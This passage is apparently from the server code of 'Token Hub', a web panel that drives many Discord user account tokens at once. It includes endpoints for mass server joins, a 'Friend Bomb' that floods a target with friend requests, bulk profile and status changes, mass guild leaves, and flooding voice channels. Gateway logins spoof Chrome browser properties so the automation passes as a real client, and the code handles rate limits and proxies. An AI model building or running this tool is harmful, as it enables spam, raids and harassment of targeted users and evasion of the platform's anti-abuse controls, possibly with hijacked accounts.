    const uname = t.display_name || t.username || t.token.slice(0, 12);
    const t0 = Date.now();
    try {
      const r = await dpost(t.token, `${API}/invites/${code}`, {});
      if (r.status === 200) {
        const gname = r.data?.guild?.name || '?';
        stats.joined++; log(room, `  [${i+1}] ✓ ${uname} → ${gname}`, 'green');
      } else if (r.status === 401) {
        markTokenExpired(t);
        stats.failed++; log(room, `  [${i+1}] ✗ ${uname} expired (401)`, 'red');
      } else if (r.status === 429) {
        const wait = (r.data?.retry_after || 5) * 1000;
        log(room, `  [${i+1}] ⏳ ${uname} ${(wait/1000).toFixed(1)}s`, 'yellow');
        await sleep(wait + 1000);
        continue;
      } else if ((r.data?.message || '').toLowerCase().includes('already') || r.status === 204) {
        stats.already++; log(room, `  [${i+1}] · ${uname} already in`, 'yellow');
      } else {
        stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red');
      }
    } catch (e) { stats.failed++; log(room, `  ✗ ${uname}: ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    const elapsed = Date.now() - t0;
    const rem = delay * 1000 - elapsed;
    if (rem > 0) await sleep(rem);
  }
  log(room, `═══ Done · ${stats.joined} joined ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Friend Bomb ──────────────────────────────────
app.post('/api/action/friend-bomb', async (req, res) => {
  const { target, tokenIds, count = 0 } = req.body;
  if (!target) return res.json({ ok: false, error: 'No target' });
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('friend-bomb');
  const room = 'friend-bomb';
  const stats = { sent: 0, failed: 0 };

  log(room, `🤝 Friend bombing '${target}' · ${list.length} tokens`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    try {
      const r = await dpost(t.token, `${API}/users/@me/relationships`, { username: target, discriminator: null });
      if (r.status === 200 || r.status === 204) {
        stats.sent++; log(room, `  [${i+1}] ✓ ${uname}`, 'green');
      } else if (r.status === 429) {
        const wait = (r.data?.retry_after || 5) * 1000;
        log(room, `  ⏳ ${(wait/1000).toFixed(1)}s`, 'yellow'); await sleep(wait + 1000);
      } else {
        stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red');
      }
    } catch (e) { stats.failed++; log(room, `  ✗ ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    await sleep(1000);
  }
  log(room, `═══ Done · ${stats.sent} sent ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Status Changer ───────────────────────────────
app.post('/api/action/status', async (req, res) => {
  const { text, presence = 'online', tokenIds, count = 0 } = req.body;
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('status');
  const room = 'status';
  const stats = { done: 0, failed: 0 };
  const payload = { status: presence, custom_status: text ? { text } : null };

  log(room, `✏️ Setting status '${text}' (${presence}) on ${list.length} tokens`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    try {
      const r = await dpatch(t.token, `${API}/users/@me/settings`, payload);
      if (r.status === 200) { stats.done++; log(room, `  [${i+1}] ✓ ${uname}`, 'green'); }
      else { stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red'); }
    } catch (e) { stats.failed++; log(room, `  ✗ ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    await sleep(500);
  }
  log(room, `═══ Done · ${stats.done} updated ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Nickname ─────────────────────────────────────
app.post('/api/action/nick', async (req, res) => {
  const { guildId, nick, tokenIds, count = 0 } = req.body;
  const gid = guildId || GUILD_ID;
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('nick');
  const room = 'nick';
  const stats = { done: 0, failed: 0 };

  log(room, `📝 Setting nick '${nick}' in ${gid}`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    try {
      const r = await dpatch(t.token, `${API}/guilds/${gid}/members/@me`, { nick: nick || null });
      if (r.status === 200) { stats.done++; log(room, `  [${i+1}] ✓ ${uname}`, 'green'); }
      else { stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red'); }
    } catch (e) { stats.failed++; log(room, `  ✗ ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    await sleep(500);
  }
  log(room, `═══ Done · ${stats.done} changed ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: HypeSquad ────────────────────────────────────
app.post('/api/action/hypesquad', async (req, res) => {
  const { house = 1, tokenIds, count = 0 } = req.body;
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('hypesquad');
  const room = 'hypesquad';
  const stats = { done: 0, failed: 0 };
  const names = { 1: 'Bravery', 2: 'Brilliance', 3: 'Balance' };

  log(room, `🏠 HypeSquad ${names[house] || house} · ${list.length} tokens`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    try {
      const r = await dpost(t.token, `${API}/hypesquad/online`, { house_id: Number(house) });
      if (r.status === 200 || r.status === 204) { stats.done++; log(room, `  [${i+1}] ✓ ${uname}`, 'green'); }
      else { stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red'); }
    } catch (e) { stats.failed++; log(room, `  ✗ ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    await sleep(500);
  }
  log(room, `═══ Done · ${stats.done} changed ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Leave Guild ──────────────────────────────────
app.post('/api/action/leave-guild', async (req, res) => {
  const { guildId, tokenIds, count = 0 } = req.body;
  if (!guildId) return res.json({ ok: false, error: 'No guild ID' });
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('leave-guild');
  const room = 'leave-guild';
  const stats = { left: 0, failed: 0 };

  log(room, `🚪 Leaving ${guildId} · ${list.length} tokens`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    try {
      const r = await ddelete(t.token, `${API}/users/@me/guilds/${guildId}`);
      if (r.status === 200 || r.status === 204) { stats.left++; log(room, `  [${i+1}] ✓ ${uname}`, 'green'); }
      else if (r.status === 429) {
        const wait = (r.data?.retry_after || 5) * 1000;
        log(room, `  ⏳ ${(wait/1000).toFixed(1)}s`, 'yellow'); await sleep(wait + 1000);
      } else { stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red'); }
    } catch (e) { stats.failed++; log(room, `  ✗ ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    await sleep(800);
  }
  log(room, `═══ Done · ${stats.left} left ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Bio Changer ──────────────────────────────────
app.post('/api/action/bio', async (req, res) => {
  const { bio, tokenIds, count = 0 } = req.body;
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('bio');
  const room = 'bio';
  const stats = { done: 0, failed: 0 };

  log(room, `📝 Setting bio on ${list.length} tokens`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    try {
      const r = await dpatch(t.token, `${API}/users/@me/profile`, { bio: bio || '' });
      if (r.status === 200) { stats.done++; log(room, `  [${i+1}] ✓ ${uname}`, 'green'); }
      else { stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red'); }
    } catch (e) { stats.failed++; log(room, `  ✗ ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    await sleep(500);
  }
  log(room, `═══ Done · ${stats.done} updated ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Display Name ─────────────────────────────────
app.post('/api/action/display-name', async (req, res) => {
  const { name, tokenIds, count = 0 } = req.body;
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('display-name');
  const room = 'display-name';
  const stats = { done: 0, failed: 0 };

  log(room, `✏️ Setting display name '${name}' on ${list.length} tokens`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    try {
      const r = await dpatch(t.token, `${API}/users/@me`, { global_name: name });
      if (r.status === 200) { stats.done++; log(room, `  [${i+1}] ✓ ${uname}`, 'green'); }
      else { stats.failed++; log(room, `  [${i+1}] ✗ ${uname} ${r.status}`, 'red'); }
    } catch (e) { stats.failed++; log(room, `  ✗ ${e.message}`, 'red'); }
    io.to(room).emit('stats', stats);
    await sleep(500);
  }
  log(room, `═══ Done · ${stats.done} changed ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Join Voice ────────────────────────────────────
app.post('/api/action/join-voice', async (req, res) => {
  const { channelId, guildId, delay = 0.4, tokenIds, count = 0 } = req.body;
  const gid  = guildId || GUILD_ID;
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job  = newJob('join-voice');
  const room = 'join-voice';
  const stats = { joined: 0, failed: 0, active: 0 };

  // Kill any pre-existing voice connections
  killVoiceConns();

  // Determine target channel(s)
  let voiceChannels = [];
  if (channelId) {
    // Single channel provided
    voiceChannels = [{ id: channelId, name: channelId }];
  } else {
    // Fetch all voice channels from the guild and distribute
    log(room, `🔍 Fetching voice channels for guild ${gid}...`, 'cyan');
    try {
      const cr = await dget(USER_TOKEN, `${API}/guilds/${gid}/channels`);
      if (cr.status === 200) {
        voiceChannels = cr.data.filter(c => Number(c.type) === 2 || Number(c.type) === 13); // voice + stage only
        const allCh = cr.data.map(c => `${c.name}(t${c.type})`).join(', ');
        log(room, `  All channels: ${allCh}`, 'muted');
        log(room, `🔊 Found ${voiceChannels.length} voice channel(s): ${voiceChannels.map(c => '#'+c.name).join(', ')}`, 'cyan');
      }
    } catch (e) { log(room, `✗ Could not fetch channels: ${e.message}`, 'red'); }
    if (!voiceChannels.length) {
      log(room, 'No voice channels found in guild', 'red');
      io.to(room).emit('done', stats);
      return;
    }
  }

  log(room, `🔊 Connecting ${list.length} tokens across ${voiceChannels.length} voice channel(s)`, 'accent');

  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t     = list[i];
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    const vchan = voiceChannels[i % voiceChannels.length]; // round-robin
    const cid   = vchan.id;
    const cname = vchan.name || cid;
    const connKey = t.user_id || t.token.slice(0, 24);
    const t0 = Date.now();

    await new Promise((resolve) => {
      let done = false;
      let heartbeatInterval = null;
      let seq         = null;
      let sessionId   = null;
      let resumeUrl   = null;
      let op4Sent     = false;
      let op4Timer    = null;

      const succeed = () => {
        if (done) return; done = true;
        stats.joined++;
        stats.active = activeVoiceConns.size;
        log(room, `  [${i+1}] ✓ ${uname} → #${cname}`, 'green');
        io.to(room).emit('stats', stats);
        resolve(); // WS stays open — do NOT close it
      };

      const fail = (reason) => {
        if (done) return; done = true;
        stats.failed++;
        log(room, `  [${i+1}] ✗ ${uname}: ${reason}`, 'red');
        io.to(room).emit('stats', stats);
        if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
        if (op4Timer) { clearTimeout(op4Timer); op4Timer = null; }
        const conn = activeVoiceConns.get(connKey);
        if (conn) { try { conn.ws.terminate(); } catch (_) {} activeVoiceConns.delete(connKey); }
        resolve();
      };

      const failTimer = setTimeout(() => fail('timeout'), 20000);

      const sendOp4 = (ws) => {
        if (op4Sent) return;
        op4Sent = true;
        ws.send(JSON.stringify({ op: 4, d: {
          guild_id: gid, channel_id: cid,
          self_mute: false, self_deaf: false,
        }}));
        // Fallback: if VOICE_STATE_UPDATE doesn't arrive in 400ms, succeed anyway
        op4Timer = setTimeout(() => { clearTimeout(failTimer); succeed(); }, 400);
      };

      const connect = (wsUrl, resume) => {
        const ws = new WebSocket(wsUrl || 'wss://gateway.discord.gg/?v=9&encoding=json');

        // Store/update connection
        activeVoiceConns.set(connKey, { ws, get hb() { return heartbeatInterval; } });

        ws.on('message', (raw) => {
          try {
            const msg = JSON.parse(raw);
            if (msg.s) seq = msg.s;

            if (msg.op === 10) {
              // Hello → start heartbeat
              const hbi = msg.d.heartbeat_interval;
              if (heartbeatInterval) clearInterval(heartbeatInterval);
              heartbeatInterval = setInterval(() => {
                try { ws.send(JSON.stringify({ op: 1, d: seq })); }
                catch (_) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
              }, hbi);

              if (resume && sessionId) {
                // Resume
                ws.send(JSON.stringify({ op: 6, d: { token: t.token, session_id: sessionId, seq } }));
              } else {
                // Identify — full browser properties required for user tokens
                ws.send(JSON.stringify({ op: 2, d: {
                  token: t.token,
                  capabilities: 30717,
                  compress: false,
                  client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, private_channels_version: '0', api_code_version: 0 },
                  presence: { status: 'online', since: 0, activities: [], afk: false },
                  properties: {
                    os: 'Windows', browser: 'Chrome', device: '',
                    system_locale: 'en-US',
                    browser_user_agent: UA,
                    browser_version: `${CHROME_VER}.0.0.0`,
                    os_version: '10',
                    referrer: '', referring_domain: '',
                    referrer_current: '', referring_domain_current: '',
                    release_channel: 'stable',
                    client_build_number: BUILD,
                    client_event_source: null,
                  },
                }}));
              }
            } else if (msg.op === 0 && msg.t === 'READY') {
              sessionId = msg.d.session_id;
              resumeUrl = msg.d.resume_gateway_url || 'wss://gateway.discord.gg/?v=9&encoding=json';
              sendOp4(ws);
            } else if (msg.op === 0 && msg.t === 'VOICE_STATE_UPDATE') {
              if (msg.d?.channel_id === cid) {
                if (op4Timer) { clearTimeout(op4Timer); op4Timer = null; }
                clearTimeout(failTimer);
                succeed();
              }
            } else if (msg.op === 0 && msg.t === 'RESUMED') {
              // Resumed — re-send voice state to stay in channel
              op4Sent = false;
              sendOp4(ws);
            } else if (msg.op === 9) {
              // Invalid session
              if (!done) {
                if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
                setTimeout(() => {
                  if (!done) ws.send(JSON.stringify({ op: 2, d: {
                    token: t.token,
                    capabilities: 30717,
                    compress: false,
                    client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, private_channels_version: '0', api_code_version: 0 },
                    presence: { status: 'online', since: 0, activities: [], afk: false },
                    properties: {
                      os: 'Windows', browser: 'Chrome', device: '',
                      system_locale: 'en-US', browser_user_agent: UA,
                      browser_version: `${CHROME_VER}.0.0.0`, os_version: '10',
                      referrer: '', referring_domain: '',
                      referrer_current: '', referring_domain_current: '',
                      release_channel: 'stable', client_build_number: BUILD, client_event_source: null,
                    },
                  }}));
                }, 1000 + Math.random() * 1000);
              }
            } else if (msg.op === 7) {
              // Discord asks to reconnect — close cleanly and resume
              if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
              try { ws.close(4000); } catch (_) {}
            }
          } catch (_) {}
        });

        ws.on('close', (code, reason) => {
          if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
          const codeStr = code ? ` (${code})` : '';
          // 4004 = auth failed (token expired/invalid) — no point retrying
          if (code === 4004) {
            markTokenExpired(t);
            activeVoiceConns.delete(connKey);
            stats.active = activeVoiceConns.size;
            io.to(room).emit('stats', stats);
            if (!done) { clearTimeout(failTimer); fail(`token invalid/expired${codeStr}`); }
            return;
          }
          // Auto-reconnect if we're meant to stay alive (done=true means succeeded, job still running)
          if (done && !job.cancelled && sessionId) {
            const url = resumeUrl || 'wss://gateway.discord.gg/?v=9&encoding=json';
            op4Sent = false;
            setTimeout(() => {
              if (!job.cancelled) {
                log(room, `  ↻ ${uname} reconnecting...`, 'yellow');
                connect(url, true);
              } else {
                activeVoiceConns.delete(connKey);
                stats.active = activeVoiceConns.size;
                io.to(room).emit('stats', stats);
              }
            }, 2000 + Math.random() * 1000);
          } else {
            activeVoiceConns.delete(connKey);
            stats.active = activeVoiceConns.size;
            io.to(room).emit('stats', stats);
            if (!done) { clearTimeout(failTimer); fail(`connection closed${codeStr}`); }
          }
        });

        ws.on('error', (e) => {
          if (!done) { clearTimeout(failTimer); fail(e.message); }
        });
      };

      connect(null, false);
    });

    const elapsed = Date.now() - t0;
    const remaining = delay * 1000 - elapsed;
    if (remaining > 0) await sleep(remaining);
  }

  log(room, `═══ Done · ${stats.joined} connected · ${activeVoiceConns.size} active WS ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── API: Important.txt ──────────────────────────────────
app.get('/api/important', (req, res) => {
  try {
    if (!fs.existsSync(IMPORTANT_FILE)) return res.json({ ok: true, content: '(important.txt not found)' });
    const raw = fs.readFileSync(IMPORTANT_FILE, 'utf-8');
    // Split into blocks by separator lines, deduplicate by content
    const blocks = [];
    const seen = new Set();
    const sep = '=' .repeat(60);
    let cur = [];
    for (const line of raw.split('\n')) {
      if (line.startsWith('====')) {
        if (cur.length) {
          const key = cur.join('\n').trim();
          if (!seen.has(key)) { seen.add(key); blocks.push([...cur, sep]); }
          cur = [];
        }
      } else {
        cur.push(line);
      }
    }
    if (cur.length) { const key = cur.join('\n').trim(); if (!seen.has(key)) blocks.push(cur); }
    res.json({ ok: true, content: blocks.flat().join('\n') });
  } catch (e) { res.json({ ok: false, content: e.message }); }
});

// ─── Action: Stop ─────────────────────────────────────────
app.post('/api/action/stop', (req, res) => {
  const { key } = req.body;
  if (key) { cancelJob(key); res.json({ ok: true }); }
  else { Object.keys(activeJobs).forEach(k => cancelJob(k)); res.json({ ok: true }); }
});

// ─── Socket.IO rooms ──────────────────────────────────────
io.on('connection', socket => {
  socket.on('join', room => socket.join(room));
  socket.on('leave', room => socket.leave(room));
});

// ─── Startup ──────────────────────────────────────────────
loadExpiredFromFile();
loadTokenCache();
// Pre-warm TLS session in background (for reauth/login) — non-blocking
initTlsSession().then(() => console.log('[TLS] Session ready')).catch(() => console.log('[TLS] Session init failed (will retry on use)'));

server.on('error', e => {
  if (e.code === 'EADDRINUSE') console.error(`[ERROR] Port ${PORT} already in use — kill the old process first.`);
  else console.error('[ERROR]', e.message);
  process.exit(1);
});

server.listen(PORT, () => {
  console.log(`\n╔══════════════════════════════════════╗`);
  console.log(`║  Token Hub  →  http://localhost:${PORT}  ║`);
  console.log(`╚══════════════════════════════════════╝`);
  console.log(`  Proxy: ${PROXY_URL ? PROXY_URL.replace(/:([^:@]+)@/, ':***@') : 'none'}`);
  console.log(`  Expired loaded: ${expiredTokens.length}\n`);
});
